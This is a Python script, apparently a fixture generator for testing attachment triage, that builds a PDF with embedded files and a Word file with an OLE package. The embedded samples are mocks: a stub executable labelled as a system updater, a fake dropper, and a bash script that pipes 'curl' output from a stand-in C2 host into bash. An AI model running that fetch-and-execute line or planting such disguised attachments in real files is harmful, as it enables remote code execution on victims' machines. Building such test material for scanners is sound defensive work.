import os
import zipfile
import fitz  # PyMuPDF
from pathlib import Path

OUT_DIR = Path("test-files")
OUT_DIR.mkdir(parents=True, exist_ok=True)

def generate_pdf_with_embedded_attachments():
    pdf_path = OUT_DIR / "pdf_with_embedded_attachments.pdf"
    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((50, 50), "Document with Embedded Attachments Triage Test", fontsize=14)
    page.insert_text((50, 80), "This PDF contains embedded file objects inside /EmbeddedFiles catalog.", fontsize=10)

    # 1. Attach a dangerous payload (PE executable)
    pe_mock = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00This program cannot be run in DOS mode." + b"\x00" * 200
    doc.embfile_add("malicious_updater.exe", pe_mock, filename="malicious_updater.exe", ufilename="malicious_updater.exe", desc="Automatic System Updater")

    # 2. Attach a script payload
    script_mock = b"#!/bin/bash\ncurl -s http://evil-c2-server.com/beacon | bash\n"
    doc.embfile_add("bootstrap.sh", script_mock, filename="bootstrap.sh", ufilename="bootstrap.sh", desc="System Bootstrapper")

    # 3. Attach a safe text note
    note_mock = b"Project Confidential Readme Notes.\nAuthorized personnel only.\n"
    doc.embfile_add("readme.txt", note_mock, filename="readme.txt", ufilename="readme.txt", desc="Confidential Notes")

    doc.save(str(pdf_path))
    doc.close()
    print(f"Generated {pdf_path} ({pdf_path.stat().st_size} bytes)")

def generate_docx_with_embedded_ole():
    docx_path = OUT_DIR / "word_with_embedded_ole_payload.docx"

    # Start with a minimal OpenXML docx structure
    # In OpenXML, an embedded package lives in word/embeddings/oleObject1.bin
    ole_payload = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 500  # OLE container header
    # Add fake inner Ole10Native package: size, name, data
    package_data = b"\x02\x00dropper.exe\x00C:\\temp\\dropper.exe\x00\x00\x00\x03\x00C:\\temp\\dropper.exe\x00" + b"MZ\x90\x00PAYLOAD_DROPPED_BY_OFFICE"

    content_types = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"""

    document_xml = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Word Document containing embedded OLE object payload.</w:t></w:r></w:p>
  </w:body>
</w:document>"""

    rels = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"""

    with zipfile.ZipFile(str(docx_path), "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/document.xml", document_xml)
        zf.writestr("word/embeddings/oleObject1.bin", ole_payload + package_data)

    print(f"Generated {docx_path} ({docx_path.stat().st_size} bytes)")

if __name__ == "__main__":
    generate_pdf_with_embedded_attachments()
    generate_docx_with_embedded_ole()
